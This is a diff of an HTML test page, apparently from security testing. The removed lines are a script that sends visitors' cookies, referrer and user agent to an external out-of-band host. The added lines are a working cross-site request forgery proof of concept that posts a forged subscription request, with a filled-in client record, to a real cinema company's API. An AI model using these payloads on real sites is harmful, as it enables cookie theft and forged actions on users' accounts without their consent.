@@ -1,11 +1,44 @@
-<!-- test.html -->
-<script>
-fetch('https://mwkvvcqlbgldlnwueopmazqp0m5mmrd80.oast.fun/POC', {
-    method: 'POST',
-    body: JSON.stringify({
-        referrer: document.referrer,
-        cookies: document.cookie,
-        userAgent: navigator.userAgent
-    })
-});
-</script>
+<!doctype html>
+<html>
+  <body>
+    <h3>CSRF PoC (no-cors)</h3>
+    <script>
+      const payload = JSON.stringify({
+        commandType: "subscription",
+        client: {
+          id: "001Jv00000kXPraIAG",
+          firstName: "test",
+          lastName: "test",
+          birthDate: "1996-10-01",
+          mobilePhone: "+33745718646",
+          homePhone: "+33745712652",
+          address: "1, boulevard de Marty",
+          city: "Schmittboeuf",
+          postalCode: "84339",
+          email: "babixo4477@vsihay.com",
+          title: "Mme",
+          country: "FR",
+          unsubscribeLoyalty: false
+        },
+        order: {
+          mailNotification: true,
+          pushNotification: false,
+          subscriptionType: "typ-abo-cp",
+          addOnTypes: [],
+          sendCopyToPayer: false,
+          zuoraSubscriptionType: "CINEPASS"
+        },
+        payer: { payerDifferent: false }
+      });
+
+      fetch('https://s.pathe.fr/subscription/api/1.0.0/lead?language=en', {
+        method: 'POST',
+        mode: 'no-cors',
+        body: payload
+      });
+      document.body.append('PoC dispatched (no-cors). Check target for created payment_id/session_id.');
+    </script>
+  </body>
+</html>
+
+
